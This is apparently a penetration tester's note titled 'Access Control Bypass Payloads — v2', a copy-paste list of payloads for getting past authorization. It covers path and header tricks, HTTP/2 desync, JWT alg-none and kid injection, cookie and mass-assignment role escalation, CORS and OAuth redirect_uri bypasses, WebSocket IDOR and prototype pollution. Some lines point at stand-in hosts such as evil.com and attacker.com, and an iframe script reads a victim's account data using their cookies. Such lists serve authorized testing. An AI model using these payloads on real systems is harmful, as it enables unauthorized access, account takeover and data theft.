---
tags: [bac, payloads, bypass, access-control]
type: payloads
date: 2026-03-10
---

# 🚪 Access Control Bypass Payloads — v2

> Copy-paste ready. Payloads are validated against real attack scenarios — dead/theoretical payloads removed.

---

## Path Traversal & Normalization Bypasses

```
Target blocked path: /admin/users

Case variants:
/ADMIN/users
/Admin/users
/aDmIn/users

Dot / double-slash normalization:
/admin//users
/admin/./users
/admin/../admin/users
/./admin/users
//admin/users

Trailing characters:
/admin/users/
/admin/users/.
/admin/users.json
/admin/users.html
/admin/users%20
/admin/users.php

URL encoding:
/%61dmin/users          (URL-encode first char 'a' → %61)
/admin%2fusers          (encode forward slash)
/admin%2Fusers          (uppercase encoding)
/admin%00/users         (null byte — for older CGI/PHP)
/admin%0a/users         (newline injection)
/admin%09/users         (tab injection)

Spring Boot specific (semicolons stripped before routing):
/admin;/users
/admin/users;junk=val
/admin/..;/users
/api/public/..;/admin/users
/actuator/..;/admin

Path traversal resolve-to-admin:
/api/../admin/users
/public/../../admin/users
/static/../../../admin/users
```

---

## Header-Based Access Control Bypasses

```http
# Convince server the request is from localhost / internal network
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Originating-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1

# Nginx / reverse proxy route override
X-Original-URL: /admin/users
X-Rewrite-URL: /admin/users
X-Override-URL: /admin/users

# Host manipulation (virtual hosting misconfig)
X-Forwarded-Host: localhost
X-Host: internal.target.com
```

---

## HTTP/2 Pseudo-Header Bypasses

HTTP/2 uses pseudo-headers (`:method`, `:path`, `:authority`, `:scheme`) instead of the HTTP/1.1 request line. Some WAFs and ACL layers inspect the HTTP/1.1-translated version but the backend processes the raw H2 pseudo-headers — creating a discrepancy.

```
Attack: WAF inspects Host header (HTTP/1.1 translation)
        Backend routes on :authority pseudo-header (H2 native)

Test in Burp (HTTP/2 Repeater):
  :method  GET
  :path    /admin/users
  :authority  target.com
  :scheme  https
  host     public.target.com    ← add duplicate Host as regular header

If ACL checks "host" but routes on ":authority": bypass possible.

Variant — :path desync:
  :path    /admin/users HTTP/1.1\r\nHost: localhost\r\n
  → Some HTTP/2 → HTTP/1.1 translation layers are vulnerable
    to header injection via path injection (H2.TE smuggling)

Test with Burp's HTTP/2 turbo intruder or manual H2 Repeater.
Note: Requires target to support HTTP/2 (check: curl --http2 -I target.com)
```

---

## HTTP Method Bypass

```
Test ALL methods on every blocked endpoint:
GET  POST  PUT  PATCH  DELETE  HEAD  OPTIONS  TRACE  CONNECT
PROPFIND  PROPPATCH  MKCOL  COPY  MOVE  LOCK  UNLOCK

HEAD is particularly useful:
  → Returns only headers, may bypass body-based auth checks
  → 200 from HEAD confirms endpoint exists and is accessible
  → Some servers return body on HEAD (Burp captures it)

OPTIONS reveals what's allowed:
  OPTIONS /api/admin/users HTTP/1.1
  → Allow: GET, POST, PUT, DELETE
  → Now test each explicitly
```

### Method Override Headers
```http
X-HTTP-Method-Override: DELETE
X-HTTP-Method: DELETE
X-Method-Override: DELETE

# URL parameter:
POST /api/admin/action?_method=GET HTTP/1.1

# Form body:
_method=DELETE
```

---

## JWT Bypass Payloads

### `alg` Header Values (none attack variants)
```
none
None
NONE
nOnE
noNe
```

### Role / Privilege Claims to Inject
```json
{"role": "admin"}
{"role": "ADMIN"}
{"role": "superadmin"}
{"role": "super_admin"}
{"role": "root"}
{"role": "staff"}
{"role": "moderator"}
{"is_admin": true}
{"isAdmin": true}
{"admin": true}
{"admin": 1}
{"privilege": 99}
{"privilege_level": 0}
{"scope": "admin:all"}
{"scope": "admin:read admin:write admin:delete"}
{"permissions": ["*"]}
{"permissions": ["admin", "superuser"]}
{"groups": ["admin", "superuser"]}
{"authorities": ["ROLE_ADMIN"]}
{"tier": "enterprise"}
{"plan": "enterprise"}
```

### `kid` Header Injection Values
```json
{"kid": "../../dev/null"}
{"kid": "../../dev/null\u0000"}
{"kid": "x' UNION SELECT 'attacker_secret'-- "}
{"kid": "/proc/sys/kernel/randomize_va_space"}
{"kid": "http://attacker.com/key.pem"}
```

---

## Cookie Role Manipulation

```
role=admin
role=ADMIN
role=superadmin
isAdmin=true
isAdmin=1
admin=true
user_type=admin
account_type=staff
privilege=99
privilege_level=0
userType=0              (legacy systems: 0 = admin)
```

---

## CORS Origin Bypass Payloads

> Only payloads that work in real browsers. Removed `%60`-backtick variants — these are rejected by browser CORS parsing before reaching the server.

```
https://evil.com
null
https://target.com.evil.com          ← subdomain suffix trust
https://eviltarget.com               ← prefix match if regex uses startsWith
https://target.com@evil.com          ← @ confusion in URL parser
https://subdomain.target.com.evil.com
http://localhost
https://localhost
http://127.0.0.1
https://127.0.0.1
https://notarealtarget.com          ← test if ACAO is wildcard
```

**Proof that `null` works (sandboxed iframe)**:
```html
<iframe sandbox="allow-scripts allow-top-navigation"
  srcdoc="<script>
    fetch('https://target.com/api/me',{credentials:'include'})
    .then(r=>r.text()).then(d=>top.postMessage(d,'*'))
  </script>">
</iframe>
```

---

## Mass Assignment Payloads

```json
{
  "isAdmin": true,
  "is_admin": true,
  "admin": true,
  "role": "admin",
  "role": "superadmin",
  "userRole": "admin",
  "user_role": "admin",
  "accountType": "admin",
  "account_type": "staff",
  "verified": true,
  "emailVerified": true,
  "email_verified": true,
  "activated": true,
  "active": true,
  "status": "active",
  "subscriptionLevel": "enterprise",
  "subscription_level": "enterprise",
  "plan": "premium",
  "tier": "platinum",
  "credits": 99999,
  "balance": 99999,
  "points": 99999,
  "ownerId": "ADMIN_USER_ID",
  "organizationId": "TARGET_ORG_ID",
  "tenantId": "TARGET_TENANT_ID",
  "workspaceId": "TARGET_WS_ID"
}
```

---

## OAuth `redirect_uri` Bypass Payloads

```
https://evil.com
https://target.com.evil.com
https://eviltarget.com
https://target.com@evil.com
https://target.com%40evil.com/callback
https://attacker.com#target.com/callback
https://target.com/callback/../../../evil
https://target.com/callback%2F..%2Fevil
https://target.com/redirect?url=https://evil.com
https://target.com/callback?other=https://evil.com
```

---

## WebSocket Message Payloads (IDOR / Privilege Escalation)

```json
{"action":"getResource","id":"VICTIM_ID"}
{"action":"subscribe","channel":"user_events","user_id":"VICTIM_ID"}
{"action":"join","room":"VICTIM_ROOM_ID"}
{"action":"admin.deleteUser","user_id":"9999"}
{"action":"admin.listAllUsers","page":1}
{"action":"user.setRole","user_id":"MY_ID","role":"admin"}
{"action":"getData","user_id":"VICTIM","role":"admin"}
{"action":"getReport","scope":"all_users"}
{"type":"subscribe","payload":{"channel":"/users/VICTIM_ID"}}
```

---

## Prototype Pollution Payloads (Node.js targets)

```json
{"__proto__": {"isAdmin": true}}
{"__proto__": {"role": "admin"}}
{"constructor": {"prototype": {"isAdmin": true}}}
{"__proto__": {"authenticated": true}}
```

```
Query string variants:
?__proto__[isAdmin]=true
?__proto__[role]=admin
?constructor[prototype][admin]=1
?__proto__[verified]=true
```

---

## Debug / Feature Flag Parameter Payloads

```
?debug=true          ?debug=1
?internal=true       ?internal=1
?admin=true          ?admin_mode=1
?bypass_auth=1       ?show_all=true
?superuser=1         ?god_mode=true
?staff=true          ?override=true
?dev=1               ?preview=true
?beta=true           ?qa=true
?feature_flag=admin  ?access=full
?test=1              ?sandbox=false
?internal_user=true  ?employee=true
```

---

## 🔗 Related Notes
- [[IDOR-Payloads]]
- [[Privilege-Escalation]]
- [[HTTP-Method-Abuse]]
- [[JWT-Misconfiguration]]
- [[CORS-Misconfiguration]]

---
*Tags: #payloads #bypass #bac #access-control · v2*
